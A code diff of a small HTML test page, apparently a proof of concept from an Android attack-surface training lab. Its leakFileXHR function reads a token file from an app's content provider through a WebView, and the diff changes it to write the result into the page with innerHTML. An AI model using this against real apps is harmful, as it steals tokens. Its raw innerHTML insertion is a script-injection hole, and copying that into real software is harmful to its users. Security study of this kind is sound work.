@@ -8,15 +8,17 @@
             xhr.open('GET', url, true);
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
+                    const resultElement = document.getElementById('result');
                     if (xhr.status === 200) {
-                        alert("File Content:\n" + xhr.responseText);
+                        resultElement.innerHTML = "<p>File Content:\n" + xhr.responseText + "</p>";
                     } else {
-                        alert("Failed to load file: " + xhr.status);
+                        resultElement.innerHTML = "<p>Failed to load file: " + xhr.status + "</p>";
                     }
                 }
             };
             xhr.onerror = function() {
-                alert("Error occurred while loading the file.");
+                const resultElement = document.getElementById('result');
+                resultElement.innerHTML = "<p>Error occurred while loading the file.</p>";
             };
             xhr.send();
         }
@@ -25,5 +27,6 @@
 <body>
     <h1>Test XMLHttpRequest with content://</h1>
     <button onclick="leakFileXHR('content://io.hextree.attacksurface.provider/token.txt')">Load File</button>
+    <div id="result"></div> <!-- Display content here -->
 </body>
 </html>
